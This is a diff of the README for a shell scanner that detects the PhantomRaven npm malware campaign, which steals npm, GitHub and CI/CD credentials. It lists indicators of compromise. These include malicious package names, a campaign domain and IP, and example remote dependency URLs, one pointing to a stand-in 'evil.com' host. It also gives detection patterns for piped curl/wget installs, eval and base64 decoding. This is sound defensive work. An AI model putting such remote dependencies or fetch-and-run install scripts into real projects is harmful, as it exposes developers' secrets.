@@ -1,12 +1,20 @@
 # PhantomRaven Scanner
 
-Universal npm malware detector for single projects or mass repository scanning.
+**Fast npm malware detector** for PhantomRaven campaign - scans single projects or mass repository batches.
 
-## 📋 What is PhantomRaven?
+## 🎯 What It Does
 
-PhantomRaven is a sophisticated npm malware campaign with **126 infected packages** and over **86,000 downloads**. It uses **Remote Dynamic Dependencies (RDD)** to hide malicious code from security scanners.
+Detects **PhantomRaven malware** that steals credentials (npm tokens, GitHub/GitLab, CI/CD secrets):
 
-**Attack method:**
+### ✅ Checks
+- **126 known malicious packages** (`unused-imports`, `eslint-comments`, `crowdstrike`, etc.)
+- **Remote Dynamic Dependencies** - HTTP/HTTPS URLs in package.json dependencies
+- **Lock files** - package-lock.json, yarn.lock, pnpm-lock.yaml for transitive dependencies
+- **Malicious domain** - `packages.storeartifact.com`
+- **Suspicious install scripts** - curl/wget piping, eval, base64 decoding
+- **Suspicious Git URLs** - non-GitHub/GitLab/Bitbucket sources
+
+### 🚨 Attack Method
 ```json
 {
   "dependencies": {
@@ -15,9 +23,11 @@ PhantomRaven is a sophisticated npm malware campaign with **126 infected package
 }
 ```
 
-The malicious code downloads during `npm install` via automatic `preinstall` scripts and steals:
+Malicious code downloads during `npm install` via automatic preinstall scripts.
+
+### 💰 What Gets Stolen
 - npm tokens (~/.npmrc)
-- GitHub/GitLab credentials
+- GitHub/GitLab credentials (~/.gitconfig)
 - CI/CD secrets (GitHub Actions, GitLab CI, Jenkins, CircleCI)
 - Environment variables and API keys
 
@@ -33,148 +43,81 @@ chmod +x phantomraven-scan.sh
 # Scan specific project
 ./phantomraven-scan.sh /path/to/project
 
-# Scan 100+ repositories with 8 workers
-./phantomraven-scan.sh --batch -w 8 ~/projects
-
-# Generate JSON report
-./phantomraven-scan.sh --batch -f json -o report.json ~/workspace
+# Verbose output
+./phantomraven-scan.sh -v ~/my-app
 ```
 
 ## 📖 Usage
-
-### Single Project Mode (Default)
 
 ```bash
 ./phantomraven-scan.sh [OPTIONS] [path]
 
 Options:
-  -v, --verbose    Show detailed information
+  -v, --verbose    Show detailed information (install scripts, lock file checks)
   -h, --help       Show help message
   [path]           Directory to scan (default: current directory)
 
 Examples:
+  # Scan current directory
   ./phantomraven-scan.sh
+
+  # Scan specific project
   ./phantomraven-scan.sh /path/to/project
+
+  # Verbose mode
   ./phantomraven-scan.sh -v ~/my-app
+
+  # Scan from parent directory (finds all package.json recursively)
+  ./phantomraven-scan.sh ~/projects
 ```
 
-### Batch Mode (Multiple Repositories)
+**Note:** The scanner finds all `package.json` files recursively in the target directory (excluding build dirs like `node_modules`, `dist`, `.next`).
 
-```bash
-./phantomraven-scan.sh --batch [OPTIONS] <directory|list_file>
+## 🔍 Detection Details
 
-Options:
-  -w, --workers N      Number of parallel workers (default: 4)
-  -f, --format FORMAT  Output format: text, json, csv
-  -o, --output FILE    Save results to file
-  --summary-only       Show only final summary
-  -v, --verbose        Show detailed output for each repo
+### Malicious Packages (126)
+Full list includes: `unused-imports`, `eslint-comments`, `transform-react-remove-prop-types`, `crowdstrike`, `mocha-no-only`, `jest-hoist`, `chai-friendly`, `aikido-module`, and 118 more.
 
-Examples:
-  # Scan all repos in directory
-  ./phantomraven-scan.sh --batch ~/projects
+### Suspicious Script Patterns
+- `curl ... | sh` / `wget ... | sh`
+- `eval $(...)` / `base64 -d`
+- Scripts in `/tmp` / `chmod +x && ...`
 
-  # Fast scan with 16 workers
-  ./phantomraven-scan.sh --batch -w 16 ~/workspace
+### Whitelisted (Safe)
+- `registry.npmjs.org` / `registry.yarnpkg.com`
+- GitHub tarball/zipball URLs
+- Standard GitHub/GitLab/Bitbucket git URLs
 
-  # Generate JSON report
-  ./phantomraven-scan.sh --batch -f json -o report.json ~/repos
+## 📊 Output Example
 
-  # Scan from list file
-  ./phantomraven-scan.sh --batch repos.txt
-
-  # Quick summary
-  ./phantomraven-scan.sh --batch --summary-only ~/workspace
-```
-
-## 🔍 What Gets Checked
-
-### 1. Known Malicious Packages (126)
-- `unused-imports`
-- `eslint-comments`
-- `transform-react-remove-prop-types`
-- `crowdstrike`
-- And 122 more from the PhantomRaven campaign
-
-### 2. Remote Dynamic Dependencies (RDD)
-HTTP/HTTPS URLs in dependencies:
-```json
-{
-  "dependencies": {
-    "pkg": "http://evil.com/package.tgz"
-  }
-}
-```
-
-### 3. Suspicious Git Dependencies
-Git URLs to unknown hosts (not GitHub/GitLab/Bitbucket):
-```json
-{
-  "dependencies": {
-    "pkg": "git+https://suspicious.com/repo.git"
-  }
-}
-```
-
-### 4. Malicious Domain
-Known PhantomRaven infrastructure:
-- Domain: `packages.storeartifact.com`
-- IP: `54.173.15.59`
-
-### 5. Suspicious Install Scripts
-Dangerous patterns in preinstall/postinstall/install scripts:
-- `curl ... | sh`
-- `wget ... | sh`
-- `eval $(...)`
-- `base64 -d` (decoding)
-- Scripts in `/tmp`
-- `chmod +x && ...`
-
-### 6. Lock Files
-Checks all lock files:
-- `package-lock.json`
-- `yarn.lock`
-- `pnpm-lock.yaml`
-
-## 📊 Output Formats
-
-### Text (Default)
 ```
 ================================================
-Scan Summary
+PhantomRaven Scanner
 ================================================
-Scanned: 150 | Clean: 148 | Infected: 2 | Errors: 0
+Scanning: /home/user/projects/my-app
+(Verbose mode)
 
-⚠ INFECTED REPOSITORIES:
-  ✗ /home/user/projects/app1
-    Malicious package: unused-imports
-  ✗ /home/user/projects/app2
-    RDD: http://packages.storeartifact.com/...
-```
+Found 1 package.json file(s)
 
-### JSON
-```json
-{
-  "scan_date": "2025-10-30T12:34:56Z",
-  "total": 150,
-  "clean": 148,
-  "infected": 2,
-  "errors": 0,
-  "duration_seconds": 45,
-  "infected_repositories": [
-    {
-      "path": "/home/user/projects/app1",
-      "findings": "Malicious package: unused-imports"
-    }
-  ]
-}
-```
+[1/1] Checking: /home/user/projects/my-app/package.json
+  ✗ Malicious package: unused-imports
+  ✗ Remote Dynamic Dependency: http://packages.storeartifact.com/npm/package-1.0.0.tgz
+    ⚠ CRITICAL: Known malicious domain!
+  → Checking package-lock.json...
+    ✗ Malicious domain in package-lock.json: packages.storeartifact.com
+    ! Issues found in package-lock.json
+  ! Issues found
 
-### CSV
-```csv
-Repository,Status,Findings
-"/home/user/projects/app1",infected,"Malicious package: unused-imports"
-"/home/user/projects/app2",clean,""
+================================================
+✗ WARNING: Malware detected!
+
+Recommended actions:
+  1. Remove malicious packages from package.json
+  2. Delete node_modules and lock files
+  3. Rotate ALL credentials: npm, GitHub, CI/CD tokens
+  4. Check ~/.npmrc and ~/.gitconfig
+  5. Review CI/CD secrets and environment variables
+  6. Reinstall dependencies from clean sources
 ```
 
 ## 🎯 Use Cases
@@ -227,19 +170,17 @@ fi
 
 ```bash
 # Crontab: Daily scan at 2 AM
-0 2 * * * /path/to/phantomraven-scan.sh --batch -f json -o /var/log/scan-$(date +\%Y\%m\%d).json ~/projects
+0 2 * * * /path/to/phantomraven-scan.sh ~/projects > /var/log/phantomraven-scan.log 2>&1
 ```
 
-### Organization Audit
+### Multiple Projects
 
 ```bash
-# Scan all developer machines
-for user in /home/*; do
-    ./phantomraven-scan.sh --batch -f csv -o "audit-$(basename $user).csv" "$user/projects"
+# Scan multiple project directories
+for project in ~/projects/*/; do
+    echo "Scanning: $project"
+    ./phantomraven-scan.sh "$project" || echo "INFECTED: $project"
 done
-
-# Combine reports
-cat audit-*.csv > organization-audit.csv
 ```
 
 ## 🚨 If Infected - Action Plan
@@ -310,56 +251,6 @@ npm install
 - Report to GitHub Security: security@github.com
 - Document the incident for compliance/audit
 
-## 📝 Creating Repository Lists
-
-For batch mode, you can provide a text file with repository paths:
-
-```bash
-# repos.txt
-/home/user/projects/app1
-/home/user/projects/app2
-# Comments are supported
-/var/www/frontend
-```
-
-Generate automatically:
-
-```bash
-# All git repos
-find ~/projects -name ".git" -type d | xargs -I {} dirname {} > repos.txt
-
-# Recently modified (last 30 days)
-find ~/projects -name ".git" -type d -mtime -30 | xargs -I {} dirname {} > recent.txt
-
-# Specific organization
-find ~/work -path "*/myorg-*/.git" -type d | xargs -I {} dirname {} > org-repos.txt
-```
-
-## ⚙️ Performance Tuning
-
-Choose worker count based on your system:
-
-```bash
-# Get CPU cores
-CORES=$(nproc)
-
-# Conservative (I/O limited, network storage)
-./phantomraven-scan.sh --batch -w $((CORES / 2)) ~/repos
-
-# Balanced (recommended)
-./phantomraven-scan.sh --batch -w $CORES ~/repos
-
-# Aggressive (CPU limited, local SSD)
-./phantomraven-scan.sh --batch -w $((CORES * 2)) ~/repos
-```
-
-**Benchmark (approximate times):**
-| Repositories | Workers | Time     |
-|-------------|---------|----------|
-| 10          | 4       | ~5s      |
-| 100         | 8       | ~45s     |
-| 500         | 16      | ~3min    |
-| 1000        | 32      | ~5min    |
 
 ## 🐛 Troubleshooting
 
@@ -377,13 +268,13 @@ find /path -name "package.json" | head
 chmod +x phantomraven-scan.sh
 ```
 
-### Slow batch scans
+### Slow scans on large monorepos
+The scanner checks all `package.json` files recursively. For large directories:
 ```bash
-# Increase workers
-./phantomraven-scan.sh --batch -w 16 ~/repos
+# Scan specific subdirectory instead
+./phantomraven-scan.sh ~/projects/my-app
 
-# Use summary-only mode
-./phantomraven-scan.sh --batch --summary-only ~/repos
+# Or scan each project individually
 ```
 
 ### False positives
